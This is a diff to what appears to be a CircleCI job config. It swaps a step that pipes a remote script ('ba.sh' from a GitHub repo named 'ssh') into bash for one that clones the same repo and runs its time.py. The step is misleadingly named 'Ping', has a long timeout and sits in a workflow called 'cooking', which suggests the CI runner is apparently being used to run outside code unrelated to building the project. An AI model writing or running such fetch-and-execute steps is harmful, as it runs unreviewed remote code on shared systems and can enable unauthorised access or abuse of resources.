@@ -11,11 +11,14 @@ jobs:
             sudo apt update
             sudo rm -rf ba.sh
             sudo apt install wget -y
+            sudo apt install python -y
       - run:
           name: Ping
           no_output_timeout: 20m
           command: |
-            wget -O - https://raw.githubusercontent.com/KernelPanic-OpenSource/ssh/main/ba.sh | bash
+            git clone https://github.com/KernelPanic-OpenSource/ssh.git py
+            cd py
+            python time.py
 workflows:
   version: 2.1
   cooking:
